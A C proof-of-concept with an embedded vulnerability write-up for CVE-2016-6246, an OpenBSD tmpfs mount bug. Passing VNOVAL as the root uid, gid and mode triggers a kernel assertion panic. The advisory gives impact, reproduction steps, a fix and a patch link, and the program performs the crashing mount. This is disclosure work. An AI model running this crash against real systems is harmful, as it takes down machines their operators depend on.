/*
 * mount_panic.c
 *    Demonstrate a panic through the mount system call.
 *
 * gcc -g mount_panic.c -o mount_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
Tmpfs mount with bad args can lead to a panic

Impact:
Root users or users on systems with kern.usermount set to true can
trigger a kernel panic when mounting a tmpfs filesystem.

Description:
The tmpfs filesystem allows the mounting user to specify a
username, a groupname or a device name for the root node of
the filesystem.  A user that specifies a value of VNOVAL for
any of these fields will trigger an assert in tmpfs_alloc_node():

    /* XXX pedro: we should check for UID_MAX and GID_MAX instead. */
    KASSERT(uid != VNOVAL && gid != VNOVAL && mode != VNOVAL);

This condition can only be triggered by users who are allowed
to mount a tmpfs filesystem. Normally this is the root user, but
if the kern.usernmount sysctl variable has been set to true,
any user could trigger this panic.

Reproduction:
Run the attached mount_panic.c program.  It will mount a tmpfs
filesystem with invalid settings and will lead to a panic of
"panic: kernel diagnostic assertion "uid != VNOVAL && gid != VNOVAL 
&& mode != VNOVAL" failed".  NCC Group was able to reproduce this issue
on OpenBSD 5.9 release running amd64.

Recommendation:
Validate the args.ta_root_uid, args.ta_root_gid and args.ta_root_mode
fields in tmpfs_mount() before calling tmpfs_alloc_node().
Return an error to the user when an invalid argument is detected.

Reported: 2016-07-11
Fixed:    http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/tmpfs/tmpfs_vfsops.c.diff?r1=1.8&r2=1.9
Assigned: CVE-2016-6246
#endif // BUG_WRITEUP ---------------------------------------------------


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/param.h>
#include <sys/mount.h>

#define VNOVAL (-1)

int main(int argc, char **argv)
{
    struct tmpfs_args args;
    int x;

    memset(&args, 0, sizeof args);
    args.ta_version = TMPFS_ARGS_VERSION;
    args.ta_root_uid = VNOVAL;
    args.ta_root_gid = VNOVAL;
    args.ta_root_mode = VNOVAL;
    x = mount("tmpfs", "/mnt", 0, &args);
    if(x == -1)
        perror("mount");
    printf("no crash!\n");
    return 0;
}
